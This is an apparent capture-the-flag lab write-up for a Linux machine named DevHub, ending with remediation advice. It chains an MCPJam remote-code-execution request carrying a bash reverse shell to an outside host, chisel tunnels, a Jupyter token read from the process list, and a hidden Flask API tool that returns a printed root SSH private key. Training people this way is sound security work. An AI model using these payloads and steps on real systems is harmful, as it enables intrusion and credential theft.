
| Property         | Value                                                                       |
| ---------------- | --------------------------------------------------------------------------- |
| **OS**           | Linux                                                                       |
| **Difficulty**   | Medium                                                                      |
| **Release Date** | 2026-05-30                                                                  |
| **State**        | Active                                                                      |
| **IP**           | 10.129.11.214                                                               |
| **Techniques**   | MCPJam RCE, local port forwarding, Jupyter code execution, hidden API abuse |
| **Tags**         | #web #privesc #linux                                                        |

---
## Summary

DevHub is a medium Linux machine hosting a custom internal analytics and development platform on port 80. The main page openly discloses the internal architecture: an MCPJam Inspector on port 6274, a Jupyter-based analytics environment on localhost port 8888, and an internal code repository. MCPJam version 1.4.2 is vulnerable to unauthenticated RCE (CVE-2026-23744), which is leveraged to gain a reverse shell as `mcp-dev`. The Jupyter service file stores the authentication token in plaintext as an environment variable, readable from the running process list. After forwarding port 8888 via chisel, JupyterLab is accessed and the `os` module is imported to execute commands as `analyst`. The `analyst` user can read an internal Flask service (`server.py`) running as root on port 5000, which exposes a hidden tool (`ops._admin_dump`) that can be used to dump credentials. Forwarding port 5000 and calling the `/tools/call `endpoint with the hardcoded API key returns the root SSH private key, granting direct SSH access as root.

---
## Enumeration

```
echo '10.129.11.214 devhub.htb' | sudo tee -a /etc/hosts
```

Added the IP address to the `/etc/hosts` file.

### Nmap Scan

```
sudo nmap -sCV devhub.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-02 14:39 EDT
Nmap scan report for devhub.htb (10.129.11.214)
Host is up (0.035s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DevHub - Internal Development Platform
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 17.68 seconds
```

### Service Enumeration

The service running on port 80 is DevHub, a custom internal development and analytics platform.

![](./screens/1.png)

The main page immediately discloses the internal architecture of the platform: an MCP Inspector active on port 6274, a Jupyter-based analytics dashboard restricted to localhost on port 8888, and an internal Git repository currently in maintenance mode.

**Vulnerable MCPJam version 1.4.2 ([CVE-2026-23744](https://github.com/advisories/GHSA-232v-j27c-5pp6)):**

![](./screens/2.png)

---

## Foothold

### CVE-2026-23744

Versions 1.4.2 and earlier of MCPJam Inspector are vulnerable to unauthenticated remote code execution. The vulnerability is caused by the `/api/mcp/connect` endpoint. While intended for connecting to MCP servers, it extracts the `command` and `args` fields from the incoming JSON body and passes them directly to the host shell without any authentication check or input validation. Since the inspector process binds on `0.0.0.0` rather than `127.0.0.1`, the endpoint is reachable externally, making exploitation possible with a single HTTP request.

### Exploitation

```shell
curl -sk -X POST http://devhub.htb:6274/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.10.14.28/1111 0>&1"],"env":{}},"serverId":"1"}'
```

```
nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.28] from (UNKNOWN) [10.129.11.214] 45766
bash: cannot set terminal process group (1076): Inappropriate ioctl for device
bash: no job control in this shell
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$
```

A shell is obtained as `mcp-dev`.

---
## Lateral Movement

Running `linpeas.sh` on the target reveals two key findings: an internal Jupyter process running as `analyst` on port 8888, and the `jupyter.service` systemd unit flagged for containing sensitive environment variables.

The process list confirms the Jupyter token is passed as a command-line argument and is therefore visible to any user on the system:

```
analyst 1074 ... /home/analyst/jupyter-env/bin/python3 \
  /home/analyst/jupyter-env/bin/jupyter-lab \
  --ip=127.0.0.1 --port=8888 \
  --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 ...
```

Token recovered: `a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7`

### Port Forwarding with Chisel

The Jupyter instance is bound to localhost and is not directly reachable from the attacker machine. Chisel is used to create a reverse tunnel and expose port 8888 externally.

Attack machine:

```
chisel server --reverse -v -p 1234
2026/06/02 14:59:00 server: Reverse tunnelling enabled
2026/06/02 14:59:00 server: Listening on http://0.0.0.0:1234
2026/06/02 14:59:38 server: session#1: tun: proxy#R:8888=>8888: Listening
```

Target machine:

```
mcp-dev@devhub:~$ ./chisel client -v 10.10.14.28:1234 R:8888:127.0.0.1:8888
2026/06/02 18:59:39 client: Connected (Latency 40.34217ms)
```

JupyterLab is now accessible at `http://localhost:8888` using the recovered token. Importing the `os` library in a new notebook allows arbitrary command execution as the `analyst` user.

![](./screens/3.png)

---

## User Flag

![](./screens/4.png)

---

## Privilege Escalation

### Enumeration

The `linpeas` output from the foothold phase already showed port 5000 as a local-only listener:

```
══╣ Local-only listeners (loopback) (T1049)
tcp   LISTEN 0      128        127.0.0.1:5000      0.0.0.0:*
tcp   LISTEN 0      128        127.0.0.1:8888      0.0.0.0:*
```

The corresponding service is also visible in the process list, running as root:

```
root  1082  0.0  0.7  37376 28692 ?  Ss  18:03   0:01  /home/manalyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

`linpeas` flags `opsmcp.service` explicitly:

```
opsmcp.service   loaded active running   OPSMCP Operations Server
  Potential issue in service: opsmcp.service
  └─ RUNS_AS_ROOT: Service runs as root
```

The script is readable as `analyst` via the JupyterLab code execution:

```python
os.system('cat /opt/opsmcp/server.py')
```

`server.py:`

```python
#!/usr/bin/env python3
"""
OPSMCP - Operations MCP Server
Internal tool for system operations management
"""

from flask import Flask, jsonify, request
import os

app = Flask(__name__)

# API Key for authentication
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"

# Registered tools (visible)
VISIBLE_TOOLS = {
    "ops.system_status": {
        "description": "Get system status and health metrics",
        "parameters": {}
    },
    "ops.list_services": {
        "description": "List running services",
        "parameters": {}
    },
    "ops.check_disk": {
        "description": "Check disk usage",
        "parameters": {}
    },
    "ops.view_logs": {
        "description": "View recent system logs",
        "parameters": {"service": "string"}
    }
}

# Hidden tools (not in /tools/list but callable)
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    "ops._debug_mode": {
        "description": "Enable debug mode",
        "parameters": {}
    }
}

ALL_TOOLS = {**VISIBLE_TOOLS, **HIDDEN_TOOLS}

def check_auth():
    """Check API key authentication"""
    api_key = request.headers.get('X-API-Key', '')
    return api_key == VALID_API_KEY

@app.route('/')
def index():
    return jsonify({
        "server": "OPSMCP",
        "version": "2.1.0",
        "status": "operational",
        "endpoints": ["/tools/list", "/tools/call", "/health"],
        "auth": "Required - X-API-Key header"
    })

@app.route('/health')
def health():
    return jsonify({"status": "healthy", "uptime": "14d 3h 22m"})

@app.route('/tools/list')
def list_tools():
    if not check_auth():
        return jsonify({"error": "Unauthorized", "message": "Valid X-API-Key header required"}), 401
    
    return jsonify({
        "tools": list(VISIBLE_TOOLS.keys()),
        "count": len(VISIBLE_TOOLS),
        "details": VISIBLE_TOOLS
    })

@app.route('/tools/call', methods=['POST'])
def call_tool():
    if not check_auth():
        return jsonify({"error": "Unauthorized", "message": "Valid X-API-Key header required"}), 401
    
    data = request.get_json() or {}
    tool_name = data.get('name', '')
    args = data.get('arguments', {})
    
    if not tool_name:
        return jsonify({"error": "Tool name required"}), 400
    
    if tool_name not in ALL_TOOLS:
        return jsonify({"error": f"Unknown tool: {tool_name}"}), 404
    
    # Execute tool
    if tool_name == "ops.system_status":
        return jsonify({
            "cpu": "23%",
            "memory": "1.2GB/4GB",
            "load": "0.45",
            "status": "nominal"
        })
    
    elif tool_name == "ops.list_services":
        return jsonify({
            "services": [
                {"name": "nginx", "status": "running", "pid": 1234},
                {"name": "opsmcp", "status": "running", "pid": 5678},
                {"name": "jupyter", "status": "running", "pid": 9012},
                {"name": "mcpjam", "status": "running", "pid": 3456}
            ]
        })
    
    elif tool_name == "ops.check_disk":
        return jsonify({
            "filesystems": [
                {"mount": "/", "used": "4.2G", "available": "15G", "percent": "22%"},
                {"mount": "/home", "used": "1.1G", "available": "8G", "percent": "12%"}
            ]
        })
    
    elif tool_name == "ops.view_logs":
        service = args.get('service', 'system')
        return jsonify({
            "service": service,
            "logs": [
                "[2026-01-22 10:00:01] Service started",
                "[2026-01-22 10:00:02] Listening on configured port",
                "[2026-01-22 10:15:33] Health check passed",
                "[2026-01-22 11:00:00] Routine maintenance completed"
            ]
        })
    
    elif tool_name == "ops._debug_mode":
        return jsonify({
            "debug": True,
            "message": "Debug mode enabled",
            "hidden_tools": list(HIDDEN_TOOLS.keys()),
            "note": "Debug endpoints now accessible"
        })
    
    elif tool_name == "ops._admin_dump":
        target = args.get('target', '')
        confirm = args.get('confirm', False)
        
        if not confirm:
            return jsonify({
                "error": "Confirmation required",
                "usage": "Set confirm=true to proceed",
                "warning": "This dumps sensitive credentials"
            })
        
        if target == "ssh_keys":
            try:
                with open('/root/.ssh/id_rsa', 'r') as f:
                    key_data = f.read()
                return jsonify({
                    "target": "ssh_keys",
                    "root_private_key": key_data,
                    "note": "Emergency recovery key dump"
                })
            except Exception as e:
                return jsonify({
                    "target": "ssh_keys",
                    "error": f"Could not read key: {str(e)}"
                })
        
        elif target == "passwords":
            return jsonify({
                "target": "passwords",
                "dump": {
                    "root": "$6$rounds=656000$saltsalt$hashedpassword",
                    "analyst": "JupyterN0tebook!2026",
                    "mcp-dev": "Mcp!Insp3ct0r2026"
                }
            })
        
        elif target == "tokens":
            return jsonify({
                "target": "tokens",
                "api_tokens": {
                    "admin_token": "opsmcp_admin_7f3b9c2d1e4f5a6b",
                    "service_token": "opsmcp_svc_8c9d0e1f2a3b4c5d"
                }
            })
        
        else:
            return jsonify({
                "error": "Invalid target",
                "valid_targets": ["ssh_keys", "passwords", "tokens"]
            })
    
    return jsonify({"error": "Tool execution failed"}), 500

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=False)
```

`ops._admin_dump` is the hidden tool used to achieve privilege escalation. When called with `target=ssh_keys` and `confirm=true`, it opens `/root/.ssh/id_rsa` as root and returns the raw key contents in the JSON response. The hardcoded API key is visible in plaintext in the source: `opsmcp_secret_key_4f5a6b7c8d9e0f1a`.

### Exploitation

Port 5000 is forwarded using chisel:

Attack machine:

```
chisel server --reverse -v -p 1234
2026/06/02 15:13:39 server: Reverse tunnelling enabled
2026/06/02 15:13:39 server: Fingerprint wzw48PL1Wl2/+5RVtGbJC4A+Qimxi/PDg1IcPzyRGsc=
2026/06/02 15:13:39 server: Listening on http://0.0.0.0:1234
2026/06/02 15:13:59 server: session#1: tun: proxy#R:5000=>5000: Listening
2026/06/02 15:13:59 server: session#1: tun: SSH connected
```

Target machine:

```
mcp-dev@devhub:~$ ./chisel client -v 10.10.14.28:1234 R:5000:127.0.0.1:5000
2026/06/02 19:13:59 client: Connecting to ws://10.10.14.28:1234
2026/06/02 19:13:59 client: Handshaking...
2026/06/02 19:14:00 client: Sending config
2026/06/02 19:14:00 client: Connected (Latency 29.808775ms)
2026/06/02 19:14:00 client: tun: SSH connected
```

### Dumping root SSH private key

The hidden `ops._admin_dump` tool is called via Burp Suite with the API key:

![](./screens/5.png)

Burp request used:

```
POST /tools/call HTTP/1.1
X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a
Host: 10.10.14.28:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/json
Content-Length: 85

{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": true}}
```

The response returns `root` SSH private key. The key is reconstructed and saved locally:

```
echo -e "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9\nG/jqltqP312IONAX9LwvTne81E4h+hi2xdjwgvh27iE4AvCQolR8S0GWHwHQjjXVQ5/dHX\n8MA96Qabow623zQe5D6PUAsFj6aWP5fDceIziAxkLIMgpsE6I0bWOKaGmgEG0rW1I/mw8z\n6HmooVORQsQoTaVUhnUmRJRcLpQEu94hzb+0kQ0ObKikcDTnit1kQ/7ZUOoyGhUgEwVk/n\nGhm2D96OW/JLpMIowwDxnka+3l9u5Aj55Y9fWN9aGld5pVvcoPRZ7twODIbXNSjzWsLQRQ\n7l8/a2M+aQAAA8BGnYWeRp2FngAAAAdzc2gtcnNhAAABAQDBYfDgi/zIPDKo5pw7m4HY4W\nv9FoPVMXX3am2Ale7S+PlJPKk5Qf0b+OqW2o/fXYg40Bf0vC9Od7zUTiH6GLbF2PCC+Hbu\nITgC8JCiVHxLQZYfAdCONdVDn90dfwwD3pBpujDrbfNB7kPo9QCwWPppY/l8Nx4jOIDGQs\ngyCmwTojRtY4poaaAQbStbUj+bDzPoeaihU5FCxChNpVSGdSZElFwulAS73iHNv7SRDQ5s\nqKRwNOeK3WRD/tlQ6jIaFSATBWT+caGbYP3o5b8kukwijDAPGeRr7eX27kCPnlj19Y31oa\nV3mlW9yg9Fnu3A4Mhtc1KPNawtBFDuXz9rYz5pAAAAAwEAAQAAAQAjgZkZkXpjRXJDwrvS\n0fWgXZtXR8gC3+b5+4eJgX3tLJuQz9t+UNhpR2XDNvQNnf3B+Ks9W0QQUznPfV0Nr3X3k6\nJtWbN0e5LuLz9PHtYHd05Z+RpS0h2LIhIWNVp+Z2H6l54dy/1LELVVU47B0kSAD0Qig3g8\nHUa/oEljrrgzTlYflRHhkHQblmd9ZaClUoxIDh0zf2Esmp3nIRBm4J1OX5UQPiPEa7/LkB\ndcQr1K4Z1pbZglc5wPUJZCv8MtVPvW9rCgERl9Sl4bKevsgS4mMMUvVxNdqyasYqNAXi/L\nCvk9YYP9PS4q1dfCYMIvsJJNyoBtUiCJwqW2ba6hs1vVAAAAgDEPkj6UOdX1B872cHrja2\nnkahzlja7GZw3G2+hsib4kH/G1nwQs9RRtnzqf/mrXeEhxB27ZN+QE39e7yTC3r6f84mSn\nMz/gS3Czh6DtP+S18jV4xCeac/SoLuxgLvPZ3xnHWvPO6HePQzyVlVk/MBfp+yPrCpIiHK\nMtVMaeJXFYAAAAgQDSlTQAPhkFhsswOcohRO+1hd/4xdD9UECem1ytsb5/on47/GEWvtQI\noocmAAMvEYlOvs8GXeYkMBAwi5VCjLunNBCmuRMjTEgE7lqgdhfkK0Lx/a4BWnYaki+xbk\nJt9XB5f2NlmnT4A5QqiO+qPYA2i1iF9CSv5ypxqHFChgMZNwAAAIEA6xcR6lBjwgtKuzRQ\nnI+f8DFRxcdfKY1gs0BmfS0RRxwDzIEwJHYafyHnq/CKBTDPCYyn/VI+mF64hhtjUbDgAr\nC8X6q/4LJecp3piSHgv6yXhpzkxtz+Q/JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK\nlFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=\n-----END OPENSSH PRIVATE KEY-----" > id_rsa

chmod 600 id_rsa
```

### Root Shell

```
ssh root@devhub.htb -i id_rsa
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-179-generic x86_64)
...
root@devhub:~#
```

---
## Root Flag

```
root@devhub:~# cat root.txt
e74ad974************************
```

---

## Remediation

- **CVE-2026-23744:** Upgrade MCPJam to a version beyond 1.4.2. 
- **Plaintext token in process list:** Pass the Jupyter token via a protected environment variable or a secrets file rather than as a command-line argument.
- **Information disclosure on main page:** The main web page should not publicly disclose internal service ports, technology stack, or access restrictions.
- **Hidden tools in API:** Apply explicit authorization checks to sensitive operations rather than simply omitting hidden tools from the listing endpoint.
- **Hardcoded API key:** Rotate the API key and store it outside the source file (e.g. via an environment variable or a secrets manager).
- **`ops._admin_dump` reading root key:** A web-facing service running as root should never expose an endpoint that reads raw SSH private keys. This represents a direct, unauthenticated path to root if the API key is ever compromised. Remove this functionality entirely or restrict it to a dedicated, network-isolated management interface.

---
## References

- [CVE-2026-23744 — MCPJam RCE](https://github.com/advisories/GHSA-232v-j27c-5pp6)